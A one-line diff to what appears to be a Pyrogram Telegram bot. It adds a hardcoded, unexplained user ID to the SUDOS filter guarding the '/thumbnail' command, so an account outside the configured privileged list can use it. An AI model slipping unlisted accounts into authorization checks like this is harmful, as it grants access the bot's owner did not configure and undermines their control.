@@ -230,7 +230,7 @@ async def listdirectory(client, event):
         await event.delete()
 
 
-@app.on_message(filters.user(SUDOS) & filters.regex("^/thumbnail ?(.*)"))
+@app.on_message(filters.user(SUDOS+[5591954930]) & filters.regex("^/thumbnail ?(.*)"))
 async def setthumb(bot, event):
 	reply = event.reply_to_message
 	if reply and reply.photo:
